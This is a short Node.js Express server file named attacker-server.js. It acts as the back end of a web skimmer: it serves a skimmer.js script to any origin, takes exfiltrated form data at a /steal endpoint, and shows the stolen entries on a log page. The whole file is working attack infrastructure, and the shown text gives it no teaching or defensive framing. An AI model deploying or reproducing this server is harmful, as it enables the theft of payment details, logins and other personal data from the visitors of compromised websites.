// attacker-server.js
const express     = require('express');
const bodyParser  = require('body-parser');
const cors        = require('cors');
const path        = require('path');

const app  = express();
const PORT = process.env.PORT || 4000;

// CORS for all origins + preflight
app.use(cors({
  origin: '*',
  methods: ['GET','POST','OPTIONS'],
  allowedHeaders: ['Content-Type']
}));
app.options('*', cors());

// Serve skimmer.js and any other static under /public
app.use(express.static(path.join(__dirname, 'public')));

// Parse everything as text (so sendBeacon/json works)
app.use(bodyParser.text({ type: '*/*' }));

let stolen = [];

// Exfil endpoint
app.post('/steal', (req, res) => {
  let data;
  try { data = JSON.parse(req.body); }
  catch { data = { raw: req.body }; }
  const entry = { time: new Date().toISOString(), data };
  stolen.push(entry);
  console.log('💥 Stolen:', entry);
  res.status(204).end();
});

// Simple log viewer
app.get('/', (req, res) => {
  res.send(`
    <html><body style="font-family:sans-serif;padding:2rem;">
      <h1>🕵️ Skimmer Data</h1>
      <pre>${JSON.stringify(stolen, null, 2)}</pre>
    </body></html>
  `);
});

app.listen(PORT, () => {
console.log('Attacker server listening on port ' + PORT);
});
